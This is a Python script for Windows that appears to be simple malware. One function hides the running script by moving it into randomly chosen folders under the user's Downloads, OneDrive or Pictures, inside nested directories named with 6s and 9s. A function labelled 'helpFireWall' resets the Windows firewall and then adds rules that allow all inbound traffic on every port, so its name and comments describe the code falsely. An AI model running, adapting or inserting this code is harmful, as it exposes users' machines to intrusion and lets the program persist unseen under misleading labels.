import subprocess,os,random,shutil,sys

psPath = r"C:\Windows\System32\WindowsPowerShell\v1.0"

def burrow():
    #tries to move current python file deep inside random directories
    global burrowFlag
    burrowFlag = False
    destination = getNewPath()
    mkDir()
    try:
        #depending on which flag is true.
        if(getmade66DirFlag()):
            sixDirPath = r'\6666\666\66\6'
            mergePath = os.getcwd() + sixDirPath #get current working directory and append 6666 dir path
            mergePath = mergePath[:-9] #only want 6666 dir
            root = moveinDir(mergePath,destination) #get root 
            finaldestPath = root + sixDirPath #append root with sixDirPath
            shutil.move(sys.argv[0], finaldestPath) #move current python file
            burrowFlag = True
        elif(getmade69DirFlag()):
            sixNineDir = r'\6969\696\69\6'
            mergePath = os.getcwd() + sixNineDir
            SixNineDirPath = mergePath[:-9]
            finaldestPath = destination+ mergePath
            shutil.move(SixNineDirPath,destination)
            shutil.move(sys.argv[0], finaldestPath)
            burrowFlag = True
        else:
            pass
    except:
        pass
    #os.chdir(getNewPath())
    #print(currentPath)

def getNewPath():
    #gets a new path that is a folder within userHome
    userHome = os.path.expanduser('~')
    num = random.randint(1,3)
    path = ''
    #depending on what num is determines path
    if num == 1:
        path += userHome + r'\Downloads'
    elif num == 2:
        path += userHome + r'\OneDrive'
    else:
        path += userHome + r'\Pictures'
    return path

def moveinDir(path,destination):
    #walks destination to find dir within it and move path in root
    for root, subfiles, files in os.walk(destination):
        if os.path.isdir(root) and root != path:
            try:
                shutil.move(path,root)
                return root
            except:
                continue


def mkDir():
    #makes a few directories and subdirectories and sets flags after made
    global made66DirFlag,made69DirFlag
    made66DirFlag = False
    made69DirFlag = False
    try:
        os.makedirs('6666/666/66/6')
        made66DirFlag = True
    except:
        try:
            os.makedirs('6969/696/69/6')
            made69DirFlag = True
        except:
            pass

def getmade66DirFlag():
    #getter method for made66DirFlag
    return made66DirFlag

def getmade69DirFlag():
    #getter method for made69DirFlag
    return made69DirFlag

def getBurrowFlag():
    #getter method for getBurrowFlag
    return burrowFlag

def helpFireWall():
    #helps firewall by trying to run a few helpful commands
    command1 = 'netsh advfirewall reset'
    command2 = 'netsh advfirewall set allprofiles state on'
    command3 = 'netsh advfirewall firewall add rule name = "Allow" protocol = all ' \
               'dir = in localport = all action = allow'
    command4 = 'netsh firewall add portopening protocol = all port = all enable all'
    try:
        os.system(command1)
        os.system(command2)
        os.system(command3)
        os.system(command4)
    except:
        try:
            subprocess.call([psPath, command1])
            subprocess.call([psPath, command2])
            subprocess.call([psPath, command3])
            subprocess.call([psPath, command4])
        except:
            pass
